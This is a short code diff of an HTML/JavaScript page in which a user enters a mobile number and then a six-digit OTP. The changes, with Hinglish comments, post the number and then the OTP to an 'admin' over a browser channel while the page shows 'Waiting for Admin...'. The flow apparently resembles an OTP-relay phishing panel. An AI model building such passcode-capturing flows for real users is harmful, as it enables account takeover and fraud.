@@ -86,7 +86,7 @@
 
     <div id="step2" style="display:none;">
       <h3>Enter OTP</h3>
-  <input id="otp" placeholder="Enter 6-digit OTP " />
+      <input id="otp" placeholder="Enter 6-digit OTP " />
       <button id="verifyBtn" onclick="verifyOtp()">Verify OTP</button>
     </div>
 
@@ -106,26 +106,31 @@
     const mobile = document.getElementById("mobile").value;
     if (!mobile) return alert("Enter mobile number");
 
+    // 🔔 ADMIN KO PEHLE HI NOTIFY KAR DO
+    channel.postMessage({
+      type: "USER_MOBILE_SUBMIT",
+      data: { mobile }
+    });
+
+    // UI flow
     document.getElementById("step1").style.display = "none";
     document.getElementById("step2").style.display = "block";
   }
 
   function verifyOtp() {
-    const mobile = document.getElementById("mobile").value;
     const otp = document.getElementById("otp").value;
-
     if (!otp || otp.length !== 6) {
       return alert("Enter 6-digit OTP");
     }
 
     const btn = document.getElementById("verifyBtn");
     btn.classList.add("loading");
-    btn.innerHTML = '<span class="spin">⏳</span> Waiting for Admin...';
+    btn.innerHTML = "⏳ Waiting for Admin...";
 
-    // send data to admin
+    // OPTIONAL: OTP bhi admin ko bhej sakte ho
     channel.postMessage({
-      type: "USER_SUBMIT",
-      data: { mobile, otp }
+      type: "USER_OTP_SUBMIT",
+      data: { otp }
     });
 
     document.getElementById("modal").style.display = "none";
